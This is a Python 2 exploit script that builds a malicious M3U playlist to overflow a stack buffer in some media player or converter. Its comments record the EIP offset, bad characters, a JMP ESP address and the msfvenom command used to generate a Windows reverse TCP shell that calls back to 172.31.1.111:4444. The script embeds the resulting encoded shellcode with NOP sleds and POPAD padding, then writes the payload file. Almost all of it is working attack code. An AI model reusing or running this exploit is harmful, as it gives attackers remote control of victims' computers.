file = "evilconv7.m3u"

#eip 1100
#ffe4 01d6f23a
#badchars  \x00,\x09, \x0a
#pop pop retn 01b36a10
#01b257f6 PUSH ESP, RETN
#pattern offset for A's xact match at offset 257

#msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=172.31.1.111 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a"



shellcode ="\x90"*20
shellcode +=("\xb8\x05\x1c\x6c\xe7\xda\xd6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x54\x31\x43\x13\x03\x43\x13\x83\xc3\x01\xfe\x99\x1b\xe1\x7c"
"\x61\xe4\xf1\xe0\xeb\x01\xc0\x20\x8f\x42\x72\x91\xdb\x07\x7e"
"\x5a\x89\xb3\xf5\x2e\x06\xb3\xbe\x85\x70\xfa\x3f\xb5\x41\x9d"
"\xc3\xc4\x95\x7d\xfa\x06\xe8\x7c\x3b\x7a\x01\x2c\x94\xf0\xb4"
"\xc1\x91\x4d\x05\x69\xe9\x40\x0d\x8e\xb9\x63\x3c\x01\xb2\x3d"
"\x9e\xa3\x17\x36\x97\xbb\x74\x73\x61\x37\x4e\x0f\x70\x91\x9f"
"\xf0\xdf\xdc\x10\x03\x21\x18\x96\xfc\x54\x50\xe5\x81\x6e\xa7"
"\x94\x5d\xfa\x3c\x3e\x15\x5c\x99\xbf\xfa\x3b\x6a\xb3\xb7\x48"
"\x34\xd7\x46\x9c\x4e\xe3\xc3\x23\x81\x62\x97\x07\x05\x2f\x43"
"\x29\x1c\x95\x22\x56\x7e\x76\x9a\xf2\xf4\x9a\xcf\x8e\x56\xf2"
"\x3c\xa3\x68\x02\x2b\xb4\x1b\x30\xf4\x6e\xb4\x78\x7d\xa9\x43"
"\x7f\x54\x0d\xdb\x7e\x57\x6e\xf5\x44\x03\x3e\x6d\x6d\x2c\xd5"
"\x6d\x92\xf9\x40\x6b\x04\xae\x8a\x72\xbb\xc6\xb6\x74\x52\x4b"
"\x3e\x92\x04\x23\x10\x0b\xe4\x93\xd0\xfb\x8c\xf9\xde\x24\xac"
"\x01\x35\x4d\x46\xee\xe0\x25\xfe\x97\xa8\xbe\x9f\x58\x67\xbb"
"\x9f\xd3\x82\x3b\x51\x14\xe6\x2f\x85\x45\x08\xb0\x55\xec\x08"
"\xda\x51\xa6\x5f\x72\x5b\x9f\xa8\xdd\xa4\xca\xaa\x1a\x5a\x8b"
"\x9a\x51\x6c\x19\xa3\x0d\x90\xcd\x23\xce\xc6\x87\x23\xa6\xbe"
"\xf3\x77\xd3\xc1\x29\xe4\x48\x57\xd2\x5d\x3c\xf0\xba\x63\x1b"
"\x36\x65\x9b\x4e\x45\x62\x63\x0c\x6b\xcb\x0c\xee\x2b\xeb\xcc"
"\x84\xab\xbb\xa4\x53\x84\x34\x05\x9b\x0f\x1d\x0d\x16\xc1\xef"
"\xac\x27\xc8\xae\x70\x27\xfe\x6a\x64\xa6\x01\x8d\x89\x48\x3e"
"\x5b\xb0\x3e\x07\x5f\x87\x31\x32\xc2\xae\xdb\x3c\x50\xb0\xc9")





stage1 = "A"*250
nops1 = "\x90"*50
#shellcode
stage2 = "A"*(26100-(len(stage1)+len(nops1)+len(shellcode)))
espspace = "X"*4 #pretending to have short post esp space
eip = "\x3a\xf2\xd6\x01" # JMP ESP
popads = "\x61"*9 #will jump over 288 bytes (257 ESP offset in stack)
jmpesp = "\xff\xe4"
nops2 = "\x90"* 3

garbage = "\x44"*100 #pretending we need to jump over this


buffer = stage1 + nops1 + shellcode + stage2 + eip + espspace + popads + jmpesp + nops2 + garbage

print len(stage1)+len(nops1)+len(stage2)+len(shellcode)
print len(stage2)


f = open(file, 'w')
f.write(buffer)
f.close()

